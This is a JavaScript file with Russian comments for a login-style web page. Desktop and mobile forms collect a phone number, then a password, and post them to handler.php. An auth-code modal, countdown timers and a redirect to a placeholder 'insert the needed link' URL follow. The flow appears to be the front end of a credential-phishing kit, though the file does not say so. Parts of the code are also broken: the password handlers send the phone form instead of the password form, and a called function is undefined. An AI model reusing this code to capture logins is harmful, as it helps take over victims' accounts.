const carouselEl = $('.my-carousel');
var passInput = document.querySelector(".inp-mob");

    carouselEl.carousel().swipeCarousel({
    sensitivity: 'high'
});






        function myTimer() {
          var x = document.getElementById("timer-content");
          if (x.style.display === "none") {
            x.style.display = "block";
            //скрытие
            setInterval(function thing() {
  
              var b1 = document.getElementById('box1');
              var b2 = document.getElementById('box2');
              
              if(b1['style'].display == 'none') {
                //b1['style'].display = 'block';
                //b2['style'].display = 'none';
              } 
              else {
                b1['style'].display = 'none';
                b2['style'].display = 'block';
              }
              
            }, 20000);
            //конец
            var timeLeft = 20;
            var elem = document.getElementById('tmr');
            var timerId = setInterval(countdown, 1000);

            function countdown() {
                if (timeLeft == -1) {
                    clearTimeout(timerId);
                    doSomething();
                } else {
                    elem.innerHTML = timeLeft + ' сек';
                    timeLeft--;
                }
            }

          } else {
            x.style.display = "none";
          }
        } 











        function myTimerDt() {
          var xdt = document.getElementById("timer-content-dt");
          if (xdt.style.display === "none") {
            xdt.style.display = "block";
            //скрытие
            setInterval(function thingDt() {
  
              var b1dt = document.getElementById('box1dt');
              var b2dt = document.getElementById('box2dt');
              
              if(b1dt['style'].display == 'none') {
                //b1dt['style'].display = 'block';
                //b2dt['style'].display = 'none';
              } 
              else {
                b1dt['style'].display = 'none';
                b2dt['style'].display = 'block';
              }
              
            }, 20000);
            //конец
            var timeLeftDt = 20;
            var elemDt = document.getElementById('tmr-dt');
            var timerIdDt = setInterval(countdownDt, 1000);

            function countdownDt() {
                if (timeLeftDt == -1) {
                    clearTimeout(timerIdDt);
                    doSomething();
                } else {
                    elemDt.innerHTML = timeLeftDt + ' сек';
                    timeLeftDt--;
                }
            }

          } else {
            xdt.style.display = "none";
          }
        } 





jQuery(document).ready(function($) {

    $("#phone").mask("+7 (999) 999-99-99");
    $("#phone-mob").mask("+7 (999) 999-99-99");

    //Отправка номера телефона (десктоп)
    $('#contactForm').on('submit', function(event) {
        
        event.preventDefault();

        var form = $('#contactForm'),
            phone = $('#phone');

        $.ajax({
            url: 'handler.php',
            type: 'POST',
            data: form.serialize(),
        });

    });

    //Отправка пароля (десктоп)
    $('#contactForm-pass').on('submit', function(event) {
        
        event.preventDefault();

        var form = $('#contactForm'),
            pass = $('#pass-mob');

        $.ajax({
            url: 'handler.php',
            type: 'POST',
            data: form.serialize(),
            success: function(result) {
                location.href = 'https://www.google.com'; //Вставьте нужную ссылку
            },
            error: function() {
                $("#pass").addClass('red');
                $(".alert-dt").addClass('alert-visible');
            },
        });

    });

    //Отправка номера телефона (мобильный)
    $('#contactForm-mob').on('submit', function(event) {
        
        event.preventDefault();

        var form = $('#contactForm-mob'),
            phone = $('#phone-mob');

        $.ajax({
            url: 'handler.php',
            type: 'POST',
            data: form.serialize(),
        });

    });

    //Отправка пароля (моб)
    $('#contactForm-mob-pass').on('submit', function(event) {
        
        event.preventDefault();

        var form = $('#contactForm-mob'),
            pass = $('#pass');

        $.ajax({
            url: 'handler.php',
            type: 'POST',
            data: form.serialize(),
            success: function(result) {
                location.href = 'https://www.google.com'; //Вставьте нужную ссылку
            },
            error: function() {
                $("#contactForm-mob-pass").addClass('red');
                $(".alert").addClass('alert-visible');
            },
        });

    });


    $("#signin").on( "click", function() {
            $('#myModal1').modal('hide');  
    });
    $("#signin").on( "click", function() {
            $('#myModal2').modal('show');  
    });

    $("#signin-mob").on( "click", function() {
            $('#mob-auth').modal('hide');  
    });
    $("#signin-mob").on( "click", function() {
            $('#mob-auth-code').modal('show');  
    });



    $('#nav').onePageNav();



    $(function() {
    $(window).scroll(function() {
        var scroll = $(window).scrollTop();
        if (scroll >= 3400) {
            $(".anch").addClass('background');
        } else {
            $(".anch").removeClass("background");
        }
    });
    });


});


